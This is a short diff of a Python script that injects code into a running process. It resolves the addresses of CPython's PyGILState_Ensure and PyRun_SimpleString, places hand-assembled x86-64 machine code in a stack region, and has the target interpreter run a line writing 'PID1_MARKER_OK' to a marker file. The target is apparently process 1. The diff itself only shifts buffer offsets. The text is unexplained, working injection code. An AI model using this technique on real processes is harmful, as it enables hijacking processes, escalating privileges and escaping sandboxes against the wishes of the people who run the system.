@@ -29,7 +29,7 @@ def off(name):
  if not c.dladdr(f,ctypes.byref(buf)): raise RuntimeError('dladdr')
  return ctypes.cast(f,ctypes.c_void_p).value-ctypes.c_void_p.from_buffer(buf,8).value
 b=base(); ens=b+off('PyGILState_Ensure'); run=b+off('PyRun_SimpleString'); rel=b+off('PyGILState_Release')
-lo,hi=stack(); code=lo+0x1000; msg=lo+0x5000; result=lo+0x7000; ns=lo+0x8000
+lo,hi=stack(); code=lo+0x10000; msg=lo+0x11000; result=lo+0x12000; ns=lo+0x8000
 text=b"open('/tmp/workspace/p1marker','w').write('PID1_MARKER_OK')\n\0"
 # store ensure return immediately, then run return immediately, then release
 sc=b'\x48\xb8'+struct.pack('<Q',ens)+b'\xff\xd0'+b'\x48\xbb'+struct.pack('<Q',result)+b'\x48\x89\x03'+b'\x49\x89\xc4'
